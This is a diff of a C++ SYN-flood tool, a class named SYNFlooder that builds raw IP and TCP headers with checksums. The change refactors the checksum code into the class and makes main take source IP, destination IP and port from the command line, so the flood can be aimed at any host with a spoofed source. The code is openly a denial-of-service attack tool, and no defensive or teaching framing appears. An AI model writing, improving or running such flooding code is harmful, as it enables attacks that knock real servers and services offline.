@@ -6,43 +6,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/socket.h>
+
 #include <cstdint>
 #include <cstring>
 #include <string>
-
-struct pseudo_header
-{
-  unsigned int source_address;
-  unsigned int dest_address;
-  unsigned char placeholder;
-  unsigned char protocol;
-  unsigned short tcp_length;
-
-  struct tcphdr tcp;
-};
-
-unsigned short checksum(unsigned short *ptr, int nbytes) {
-  long sum;
-  unsigned short oddbyte;
-  short answer;
-
-  sum = 0;
-  while (nbytes > 1) {
-    sum += *ptr++;
-    nbytes -= 2;
-  }
-  if (nbytes == 1) {
-    oddbyte = 0;
-    *((u_char *)&oddbyte) = *(u_char *)ptr;
-    sum += oddbyte;
-  }
-
-  sum = (sum >> 16) + (sum & 0xffff);
-  sum = sum + (sum >> 16);
-  answer = (short)~sum;
-
-  return (answer);
-}
 
 class SYNFlooder {
  private:
@@ -58,6 +25,39 @@ class SYNFlooder {
   /* Again, any number can be here, since we are not going to respond. */
   const uint16_t SRC_PORT = 3313;
   const uint16_t TTL = 255;
+
+  struct pseudo_header {
+    unsigned int source_address;
+    unsigned int dest_address;
+    unsigned char placeholder;
+    unsigned char protocol;
+    unsigned short tcp_length;
+
+    struct tcphdr tcp;
+  };
+
+  unsigned short Checksum(unsigned short *ptr, int nbytes) {
+    long sum;
+    unsigned short oddbyte;
+    short answer;
+
+    sum = 0;
+    while (nbytes > 1) {
+      sum += *ptr++;
+      nbytes -= 2;
+    }
+    if (nbytes == 1) {
+      oddbyte = 0;
+      *((u_char *)&oddbyte) = *(u_char *)ptr;
+      sum += oddbyte;
+    }
+
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum = sum + (sum >> 16);
+    answer = (short)~sum;
+
+    return (answer);
+  }
 
   void FillIP(iphdr *ip_header, char *datagram_buf) {
     ip_header->ihl =
@@ -84,7 +84,7 @@ class SYNFlooder {
     ip_header->daddr = inet_addr(dest_ip.c_str());    // Destination IP
 
     ip_header->check =
-        checksum(reinterpret_cast<unsigned short *>(datagram_buf),
+        Checksum(reinterpret_cast<unsigned short *>(datagram_buf),
                  ip_header->tot_len >> 1);
   }
 
@@ -116,7 +116,7 @@ class SYNFlooder {
 
     memcpy(&ps_header.tcp, tcp_header, sizeof(*tcp_header));
 
-    tcp_header->check = checksum(reinterpret_cast<unsigned short *>(&ps_header),
+    tcp_header->check = Checksum(reinterpret_cast<unsigned short *>(&ps_header),
                                  sizeof(ps_header));
   }
 
@@ -167,8 +167,17 @@ class SYNFlooder {
   ~SYNFlooder() = default;
 };
 
-int main(void) {
-  SYNFlooder flooder{"172.20.10.2", "172.20.10.1", 80};
+int main(const int argc, const char** argv) {
+  if (argc < 4) {
+    perror("Invalid arguments");
+    exit(1);
+  }
+
+  std::string src = argv[1];
+  std::string dest = argv[2];
+  uint16_t port = strtol(argv[3], NULL, 10);
+
+  SYNFlooder flooder{src, dest, port};
   flooder.Flood(true);
   return 0;
 }
